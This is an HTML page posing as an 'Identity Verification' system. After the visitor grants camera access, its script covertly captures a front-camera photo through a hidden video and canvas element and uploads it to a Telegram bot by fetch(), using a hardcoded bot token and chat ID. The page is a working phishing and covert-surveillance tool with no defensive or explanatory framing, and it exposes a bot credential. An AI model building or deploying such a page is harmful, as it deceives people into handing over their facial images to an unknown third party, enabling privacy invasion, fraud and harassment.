<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 50px 20px; }
        .card { border: 2px solid #28a745; padding: 30px; border-radius: 20px; background: #111; max-width: 400px; margin: auto; }
        button { background: #28a745; color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 20px; color: #ffc107; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Verification System</h2>
        <p>Please click the button and allow camera access to continue.</p>
        <button id="authBtn">Start Verification</button>
        <div id="status">Ready</div>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
        // This will send the photo to the first admin ID
        const ADMIN_ID = "7289235107"; 

        document.getElementById('authBtn').onclick = async () => {
            const s = document.getElementById('status');
            try {
                s.innerText = "Requesting Permission...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                s.innerText = "Processing...";
                const v = document.getElementById('v');
                v.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth;
                    canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                    const fd = new FormData();
                    fd.append('chat_id', ADMIN_ID);
                    fd.append('photo', blob, 'verify.jpg');

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    s.innerText = "‚úÖ Success!";
                    stream.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch (e) {
                s.innerHTML = "‚ùå Error: Camera Blocked.<br>Please allow camera in site settings (Lock üîí icon).";
            }
        };
    </script>
</body>
</html>
